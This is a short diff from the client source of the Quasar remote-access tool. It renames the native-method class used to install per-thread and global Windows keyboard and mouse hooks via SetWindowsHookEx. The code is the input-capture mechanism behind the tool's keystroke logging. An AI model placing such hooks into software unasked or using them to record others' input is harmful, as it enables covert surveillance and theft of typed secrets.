@@ -40,11 +40,11 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         {
             _appHookProc = (code, param, lParam) => HookProcedure(code, param, lParam, callback);
 
-            var hookHandle = HookNativeMethods.SetWindowsHookEx(
+            var hookHandle = ClientNatives.SetWindowsHookEx(
                 hookId,
                 _appHookProc,
                 IntPtr.Zero,
-                ThreadNativeMethods.GetCurrentThreadId());
+                ClientNatives.GetCurrentThreadId());
 
             if (hookHandle.IsInvalid)
                 ThrowLastUnmanagedErrorAsException();
@@ -56,7 +56,7 @@ namespace Quasar.Client.MouseKeyHook.WinApi
         {
             _globalHookProc = (code, param, lParam) => HookProcedure(code, param, lParam, callback);
 
-            var hookHandle = HookNativeMethods.SetWindowsHookEx(
+            var hookHandle = ClientNatives.SetWindowsHookEx(
                 hookId,
                 _globalHookProc,
                 Process.GetCurrentProcess().MainModule.BaseAddress,
@@ -85,7 +85,7 @@ namespace Quasar.Client.MouseKeyHook.WinApi
 
         private static IntPtr CallNextHookEx(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            return HookNativeMethods.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+            return ClientNatives.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
         private static void ThrowLastUnmanagedErrorAsException()
